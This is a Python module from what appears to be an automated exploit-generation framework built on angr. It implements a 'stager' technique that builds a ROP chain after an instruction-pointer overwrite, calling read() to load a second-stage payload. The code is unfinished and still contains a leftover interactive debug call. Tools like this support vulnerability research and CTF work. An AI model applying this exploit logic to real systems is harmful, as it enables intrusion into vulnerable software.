"""
FIXME
This technique is a HACK!!!
It should be rewritten to be something like CrashManager
to handle multi-stage exploitation properly
"""
import logging

import angr
from angrop.errors import RopException

from ...vulnerability import Vulnerability
from ..technique import Technique
from .. import Exploit, CannotExploit

l = logging.getLogger("rex.exploit.techniques.stager")

class Stager(Technique):

    name = "stager"
    applicable_to = ['unix']

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.stagers = []

    def _is_valid(self, addr):
        if not addr:
            return False
        state = self.crash.state
        if not state.satisfiable(extra_constraints=[state.regs.pc == addr]):
            l.debug("The stager function @ %#x could not be called" % addr)
            return False
        return True

    def check(self):
        # can only exploit ip overwrites
        if not self.crash.one_of([Vulnerability.IP_OVERWRITE, Vulnerability.PARTIAL_IP_OVERWRITE]):
            self.check_fail_reason("Cannot control IP.")
            return False

        # TODO: in case the target reads from stdin, gets is a prefered stager function
        # TODO: recv is also a good stager function
        read_plt_addr = self._find_func_address("read")
        if self._is_valid(read_plt_addr):
            self.stagers.append(read_plt_addr)
        read_addr = self._find_libc_func_address("read")
        if self._is_valid(read_addr):
            self.stagers.append(read_addr)

        if not self.stagers:
            self.check_fail_reason("No valid stager function...")
            return False

        return True

    def _find_libc_writable_region(self, data):
        segments = self.libc_rop.project.loader.main_object.segments
        for seg in segments:
            if seg.is_writable:
                return seg.max_addr - len(data)
        raise RopException("Cannot find writable region inside libc")

    def _invoke_stager(self, fd):
        # FIXME: don't hardcode data length here
        addr = self._find_libc_writable_region(b'A'*0x200)
        print("invoke stager")
        import IPython; IPython.embed()

        if not self.crash.project.arch.name.startswith("MIPS"):
            chain = self.libc_rop.func_call(self.stagers[-1], [fd, addr, 0x41414141])
            print(chain)
            # insert the chain into the binary
            try:
                chain, chain_addr = self._ip_overwrite_with_chain(chain, state=self.crash.state, rop=self.libc_rop)
            except CannotExploit as e:
                raise CannotExploit("[%s] unable to insert chain" % self.name) from e

            # add the constraint to the state that the chain must exist at the address
            chain_mem = self.crash.state.memory.load(chain_addr, chain.payload_len)
            self.crash.state.add_constraints(chain_mem == self.crash.state.solver.BVV(chain.payload_str()))
            return

        raise RuntimeError()

    def apply(self, **kwargs):# pylint:disable=arguments-differ
        self._invoke_stager(self.crash.trace_result.taint_fd)
        return Exploit(self.crash, bypasses_nx=True, bypasses_aslr=False)
